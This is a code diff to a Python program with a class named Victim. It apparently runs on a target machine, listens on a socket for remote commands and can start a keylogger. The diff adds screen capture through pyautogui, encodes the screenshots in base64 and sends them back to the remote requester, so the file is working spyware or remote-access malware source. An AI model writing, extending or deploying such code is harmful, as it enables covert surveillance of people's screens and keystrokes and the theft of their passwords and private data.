@@ -5,6 +5,9 @@ import sys
 import selectors
 import types
 from keylogger import KeyLogger
+import pyautogui
+import base64
+import io
 
 SHELL_ARGUMENTS = sys.argv
 
@@ -13,6 +16,18 @@ IP = '0.0.0.0' if len(SHELL_ARGUMENTS) < 2 else SHELL_ARGUMENTS[1]  # TODO: modi
 PORT = 5000 if len(SHELL_ARGUMENTS) < 3 else SHELL_ARGUMENTS[2]
 SOCK_BYTE_LIMIT = 4096
 my_key_logger = KeyLogger()
+
+
+def get_file_bytes(path):
+    with open(path, 'rb') as file:
+        bytes_content = file.read()
+    return bytes_content
+
+def im_2_b64(image):
+    buff = io.BytesIO()
+    image.save(buff, format="JPEG")
+    img_str = base64.b64encode(buff.getvalue())
+    return img_str
 
 
 class Victim:
@@ -84,9 +99,19 @@ class Victim:
             if data.outb.decode('utf-8'):
                 # get the proper response for the request
                 response_dict = self.process_request(string_data)
-                response = json.dumps(response_dict)
-                # encode the response to bytes in utf-8
-                data.outb = response.encode('utf-8')
+                if response_dict['type'] == 'json':
+                    response = json.dumps(response_dict)
+                    # encode the response to bytes in utf-8
+                    data.outb = response.encode('utf-8')
+                elif 'image' in response_dict['type']:
+                    response = data.outb = response_dict['image_bytes']
+
+                elif 'text' in response_dict['type']:
+                    response = data.outb = response_dict['text_bytes']
+
+                else:
+                    print("unsupported format..")
+                    pass  # TODO: throw an exception here
 
                 # calculate the number of messages required to send the bytes, considering the byte limit.
                 bytes_to_send = total_bytes = len(data.outb)
@@ -123,8 +148,10 @@ class Victim:
 
         if request_dict['type'] == 'request':
             if request_dict['resource'] == 'screenshot':
-                print("taking a screenshot")
-                return {'status': 'success', 'type': 'image/png'}
+                print("taking a screenshot...")
+                image = pyautogui.screenshot("temp.png")
+                image_bytes = im_2_b64(image)
+                return {'status': 'success', 'type': 'image/png', 'image_bytes': image_bytes}
         elif request_dict['type'] == 'action':
             if request_dict['action'] == 'start_keylogging':
                 print("starting keylogging")
